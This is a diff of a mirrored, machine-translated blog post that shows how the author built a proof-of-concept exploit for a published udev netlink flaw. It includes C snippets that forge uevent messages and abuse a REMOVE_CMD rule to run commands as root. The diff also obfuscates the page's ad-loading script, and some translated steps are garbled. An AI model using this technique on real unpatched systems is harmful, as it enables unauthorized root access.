@@ -24,12 +24,12 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
 
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
   <script>
-       (adsbygoogle = window.adsbygoogle || []).push({
-            google_ad_client: "ca-pub-6974184241884155",
-            enable_page_level_ads: true
-       });
+        var superSpecialObject = {};
+        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
+        superSpecialObject['enable_page_level_a' + 'ds'] = true;
+       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
   </script>
 </head>
 
@@ -51,7 +51,7 @@
   <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
   <section class="page js-page"><h1>A boring exploit for one wide hole</h1><div class="post__text post__text-html js-mediator-article">  The Habrouseur <a href="https://habrahabr.ru/users/allan_sundry/" class="user_link">allan_sundry</a> in the <a href="http://habrahabr.ru/blogs/infosecurity/57499/">pro botnet</a> flame <a href="http://habrahabr.ru/blogs/infosecurity/57499/">under Mac OS X</a> did not believe that the recent vulnerability in Linux udev is really wide, deep and in some cases even dangerous.  In response, I decided to write this topic, demonstrating that even a freelance dropout student can often create a working exploit for a published vulnerability, spending a couple of hours on Sunday evening. <br><a name="habracut"></a><br>  Input - <a href="http://bugzilla.redhat.com/show_bug.cgi%3Fid%3D495051">udev does not check the sender of the message</a> . <br><br>  And here is the whole simple process of creating an exploit in steps: <ol><li>  Download the udev sources, grep, we find that we need to create a netlink socket for the NETLINK_KOBJECT_UEVENT protocol: <blockquote><code>int netlink_socket = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);</code> </blockquote> </li><li>  We read <code>man 7 netlink</code> and fill in the destination address for the package: <br><blockquote> <code>struct sockaddr_nl dest;&lt;br/&gt;memset(&amp;dest, 0, sizeof(dest));&lt;br/&gt;dest.nl_family = AF_NETLINK;&lt;br/&gt;dest.nl_pid = pidof_udev;&lt;br/&gt;</code> </blockquote> </li><li>  Run <code>strace -p `pidof udevd`</code> , <code>strace -p `pidof udevd`</code> something into USB and get an approximate package format: <blockquote> <code>#define REQ(act, dev) \&lt;br/&gt; act "@/class/mem/" dev "\0" \&lt;br/&gt; "UDEV_LOG=3\0" \&lt;br/&gt; "ACTION=" act "\0" \&lt;br/&gt; "DEVPATH=/class/mem/" dev "\0" \&lt;br/&gt; "SUBSYSTEM=mem\0" \&lt;br/&gt; "MAJOR=1\0" \&lt;br/&gt; "MINOR=1\0" \&lt;br/&gt; "SEQNUM=3747\0" \&lt;br/&gt; "UDEVD_EVENT=1\0" \&lt;br/&gt; "DEVNAME=/dev/" dev "\0"&lt;br/&gt;char req1[] = REQ("add", "ufo");</code> </blockquote> </li><li>  Ship this package: <blockquote> <code>sendto(netlink_socket, req1, sizeof(req1)-1, 0, (struct sockaddr*)&amp;dest, sizeof(dest));</code> </blockquote>  And we get the answer “Connection refused”. </li><li>  We study once again the udev source and find that the netlink socket opens before the daemon goes into the background, fork () - nougat.  Pid-s <em>are usually</em> issued sequentially, so we just try to specify a slightly different address: <blockquote> <code>dest.nl_pid = pidof_udev <strong>- 1</strong> ;</code> </blockquote>  After that, <code>send()</code> did not return any errors, and moreover, a strange <code>/dev/ufo</code> file appeared in <code>/dev</code> , which was just created through a hole in udev.  But to create a device is not very interesting, it is better to execute your code. </li><li>  The difficult way to implement your code into the kernel through special devices <code>/dev/mem</code> and <code>/dev/kmem</code> is interesting, but for a proof-of-concept, you can also cut the road.  Run <code>grep -r RUN /etc/udev/rules.d/</code> and find the strange written rule: <blockquote> <code>ACTION=="remove", ENV{REMOVE_CMD}!="", RUN+="$env{REMOVE_CMD}"</code> </blockquote> </li><li>  Add another netlink message, this time to remove <code>/dev/ufo</code> : <blockquote> <code>char req2[] = REQ("remove", "ufo") "REMOVE_CMD=/bin/touch /woot\0";&lt;br/&gt;sendto(netlink_socket, req2, sizeof(req2)-1, 0, (struct sockaddr*)&amp;dest, sizeof(dest));</code> </blockquote>  Run ... UFO flew in and left the file <code>/woot</code> ! </li></ol>  All of the above was tested on Gentoo but will probably work under Ubuntu.  Those who are not updated and wish to independently set up an experiment can download <a href="">the entire code</a> . <br><br>  PS boring topic, is not it? </div>
       <br>
-        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"></script>')</script>
         <ins class="adsbygoogle"
           style="display:block; text-align:center;"
           data-ad-layout="in-article"
@@ -59,10 +59,10 @@
           data-ad-client="ca-pub-6974184241884155"
           data-ad-slot="8945601208"></ins>
         <script>
-          (adsbygoogle = window.adsbygoogle || []).push({});
+          (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push({});
         </script>
       <br>
-    <p>Source: <a href="https://habr.com/ru/post/57687/">https://habr.com/ru/post/57687/</a></p>
+    <p>Source: https://habr.com/ru/post/57687/</p>
 <section class="more-articles-navigation-panel js-more-articles-navigation-panel">
 <h4>More articles:</h4>
 <nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
@@ -72,10 +72,10 @@
 <li><a href="../57685/index.html">Simulation of view. Part six. Eye tracking modeling</a></li>
 <li><a href="../57686/index.html">Vision modeling</a></li>
 <li><a href="../57688/index.html">Perfect smartphone. Thoughts in the course of life</a></li>
+<li><a href="../5769/index.html">About jobs</a></li>
 <li><a href="../57693/index.html">Czech! The process of obtaining a residence permit</a></li>
 <li><a href="../57696/index.html">Free lecture on HTML-layout in Minsk. April 23, Thursday</a></li>
 <li><a href="../57698/index.html">Tariff tables: examples and best solutions</a></li>
-<li><a href="../57702/index.html">Last check before launching site</a></li>
 </ul></nav>
 </section><br />
 <a href="../../allArticles.html"><strong>All Articles</strong></a>
